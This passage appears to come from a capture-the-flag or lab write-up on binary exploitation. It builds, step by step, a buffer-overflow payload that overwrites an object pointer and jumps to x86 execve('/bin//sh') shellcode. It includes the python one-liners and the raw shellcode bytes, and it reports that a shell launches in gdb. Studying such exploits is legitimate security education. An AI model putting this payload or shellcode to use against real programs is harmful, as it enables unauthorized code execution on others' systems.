And it works ! The shell is launched in gdb !


## Payload construction 

We overwrite the address of the first object to an address in the stack
```
`python -c 'print "A"*(108) +"\x0c\xa0\x04\x08"'`
```

Then make this first address point to a second address, wich points to assembly instructions (`0x0804a00c -> 0x0804a010 -> 0xCC`):

```
`python -c 'print "\x10\xa0\x04\x08" + "\xCC"*104 +"\x0c\xa0\x04\x08"'`
```
And finally we replace the first bytes by the `shellcode`:
```
`python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xCC"*(104-28) +"\x0c\xa0\x04\x08"'`
```


